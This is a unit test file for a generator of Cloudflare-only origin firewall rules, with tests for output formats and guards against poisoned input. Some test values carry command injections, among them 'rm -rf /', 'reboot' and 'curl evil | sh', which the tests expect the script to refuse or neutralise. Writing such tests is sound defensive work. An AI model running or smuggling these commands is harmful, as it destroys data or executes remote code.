"""Tests for generate_cf_firewall_rules.py, run offline against a ranges file.

CI additionally loads the nftables and iptables output on a Linux runner
(see .github/workflows/ci.yml); these tests check structure, validation and
guards on any platform.
"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPT = os.path.join(ROOT, "skills", "cloudflare-origin-protection", "scripts",
                      "generate_cf_firewall_rules.py")

CF_V4 = ["173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "141.101.64.0/18",
         "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22", "198.41.128.0/17",
         "162.158.0.0/15", "104.16.0.0/13", "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"]
CF_V6 = ["2400:cb00::/32", "2606:4700::/32", "2803:f800::/32", "2405:b500::/32", "2405:8100::/32",
         "2a06:98c0::/29", "2c0f:f248::/32"]
FORMATS = ["nftables", "iptables", "ufw", "aws", "gcp", "windows", "nginx", "apache", "caddy", "cidr", "json"]


class GeneratorTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp()
        cls.ranges = cls.write("ranges.txt", "\n".join(CF_V4 + CF_V6) + "\n")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    @classmethod
    def write(cls, name, text):
        path = os.path.join(cls.tmp, name)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)
        return path

    def gen(self, *args, **kw):
        cmd = [sys.executable, "-I", SCRIPT] + list(args)
        if kw.get("ranges", True):
            cmd += ["--ranges-file", self.ranges]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True,
                              timeout=120)
        return proc.returncode, proc.stdout, proc.stderr

    # ------------------------------------------------------------------ formats

    def test_every_format_generates_offline(self):
        for fmt in FORMATS:
            with self.subTest(fmt=fmt):
                code, out, err = self.gen("--format", fmt)
                self.assertEqual(code, 0, err)
                self.assertTrue(out.strip())
                self.assertIn("match the bundled snapshot", err)

    def test_nftables_structure(self):
        code, out, err = self.gen("--format", "nftables")
        self.assertEqual(code, 0, err)
        self.assertRegex(out, r"(?m)^table inet cf_origin$")
        self.assertRegex(out, r"(?m)^delete table inet cf_origin$")
        self.assertIn("type filter hook prerouting priority -150; policy accept;", out)
        self.assertEqual(len(re.findall(r"\b\d+\.\d+\.\d+\.\d+/\d+", out)), 15)
        self.assertEqual(len(re.findall(r"\b[0-9a-f]{4}:[0-9a-f:]*::/\d+", out)), 7)
        self.assertIn("udp dport { 80, 443 } counter drop", out)
        self.assertNotRegex(out, r",\s*\n\s*\}")  # no trailing comma before a closing brace
        self.assertIn("Scope: every interface except loopback", out)
        self.assertIn("no --public-iface", err)

    def test_nftables_scoped_to_public_interfaces(self):
        code, out, err = self.gen("--format", "nftables", "--ports", "443", "--deny-ports", "80",
                                  "--public-iface", "eth0", "--public-iface", "ens5", "--public-iface", "eth0")
        self.assertEqual(code, 0, err)
        self.assertIn('iifname { "eth0", "ens5" } tcp dport { 443 } counter drop', out)
        self.assertIn('iifname { "eth0", "ens5" } tcp dport { 80 } counter drop', out)
        self.assertRegex(out, r"(?m)^\t\ttcp dport \{ 443 \} ip saddr @cf_v4 accept$")
        self.assertNotIn("no --public-iface", err)

    def test_no_v6_and_no_udp_drop(self):
        _, out, _ = self.gen("--format", "nftables", "--no-v6")
        self.assertNotRegex(out, r"elements = \{\s*\}")
        self.assertRegex(out, r"set cf_v6 \{\s*type ipv6_addr\s*flags interval\s*\}")
        _, out, _ = self.gen("--format", "nftables", "--no-udp-drop")
        self.assertNotIn("udp dport { 80, 443 }", out)

    def test_also_allow(self):
        code, out, err = self.gen("--format", "nftables", "--also-allow", "10.0.1.5/24", "--also-allow", "fc00::/7")
        self.assertEqual(code, 0, err)
        self.assertIn("10.0.1.0/24", out)
        self.assertIn("fc00::/7", out)

    def test_iptables_script(self):
        code, out, err = self.gen("--format", "iptables", "--public-iface", "eth0", "--ports", "443",
                                  "--deny-ports", "80")
        self.assertEqual(code, 0, err)
        self.assertIn("NEW=CF_ORIGIN_$$", out)
        self.assertIn("drop_chains $stale_chains", out)
        self.assertIn("IPv6 web ports are NOT filtered", out)
        self.assertIn("-I PREROUTING 1 -i eth0 -m addrtype --dst-type LOCAL -p tcp -m multiport --dports 443 "
                      "-m comment --comment $TAG -j $NEW", out)
        sh = shutil.which("sh")
        if sh and os.name != "nt":
            script = self.write("cf.sh", out)
            self.assertEqual(subprocess.run([sh, "-n", script]).returncode, 0)

    def test_windows_script_replaces_rules_safely(self):
        _, out, _ = self.gen("--format", "windows", "--ports", "443")
        self.assertLess(out.index("New-NetFirewallRule"), out.index('-notlike "$Gen-*"'))
        self.assertIn("RD Gateway", out)
        self.assertIn("block TCP 443 from everyone else", out)

    def test_aws_json_and_quota_warning(self):
        code, out, err = self.gen("--format", "aws")
        self.assertEqual(code, 0, err)
        self.assertEqual([p["FromPort"] for p in json.loads(out)], [80, 443])
        _, _, err = self.gen("--format", "aws", "--ports", "80,443,8443,2053,2083")
        self.assertIn("exceed the default quota", err)

    def test_json_round_trip_even_with_no_v6(self):
        _, out, _ = self.gen("--format", "json", "--no-v6")
        copy = self.write("copy.json", out)
        code, out, err = self.gen("--format", "cidr", "--ranges-file", copy, ranges=False)
        self.assertEqual(code, 0, err)
        self.assertEqual(len(out.split()), 22)

    # ------------------------------------------------------------------ guards

    def test_usage_guards(self):
        for args in (["--ports", "443", "--deny-ports", "443"], ["--also-allow", "0.0.0.0/0"],
                     ["--also-allow", "::/0"], ["--ports", "80;rm -rf /"], ["--ports", "22,443"],
                     ["--deny-ports", "3389"], ["--ports", "5985"], ["--public-iface", "eth0;reboot"],
                     ["--public-iface", "lo"], ["--timeout", "0"]):
            with self.subTest(args=args):
                code, _, _ = self.gen(*args)
                self.assertEqual(code, 2)

    def test_poisoned_or_suspicious_lists_are_refused(self):
        widened = "\n".join(CF_V4 + ["45.0.0.0/8"] + CF_V6)
        truncated = "\n".join(CF_V4[:2] + CF_V6[:4])
        cases = {
            "html": "<html><body>Captive portal</body></html>",
            "world": "0.0.0.0/0\n2400:cb00::/32",
            "shell": "173.245.48.0/20; curl evil | sh\n2400:cb00::/32",
            "private": "10.0.0.0/8\n2400:cb00::/32",
            "v6missing": "173.245.48.0/20",
            "hostbits": "173.245.48.1/20\n2400:cb00::/32",
            "truncated": truncated,
            "widened": widened,
        }
        for name, text in cases.items():
            with self.subTest(case=name):
                path = self.write("bad-%s.txt" % name, text + "\n")
                code, out, err = self.gen("--format", "nftables", "--ranges-file", path, ranges=False)
                self.assertEqual(code, 1, err)
                self.assertIn("[error]", err)
                self.assertEqual(out, "")
        path = self.write("truncated.txt", truncated + "\n")
        code, _, err = self.gen("--format", "cidr", "--ranges-file", path, "--accept-changes", ranges=False)
        self.assertEqual(code, 0, err)

    def test_banner_injection_is_neutralised(self):
        path = self.write("inject.json", json.dumps({
            "ipv4_cidrs": CF_V4, "ipv6_cidrs": CF_V6, "etag": "abc\nrm -rf / #"}))
        code, out, err = self.gen("--format", "iptables", "--ranges-file", path, ranges=False)
        self.assertEqual(code, 0, err)
        self.assertNotRegex(out, r"(?m)^rm -rf")
        self.assertNotIn("etag abc", out)

    def test_falls_back_to_snapshot_unless_live_is_required(self):
        code, out, err = self.gen("--format", "cidr", "--timeout", "0.0001", ranges=False)
        self.assertEqual(code, 0, err)
        self.assertIn("bundled snapshot", err)
        code, _, _ = self.gen("--format", "cidr", "--timeout", "0.0001", "--require-live", ranges=False)
        self.assertEqual(code, 1)


if __name__ == "__main__":
    unittest.main()
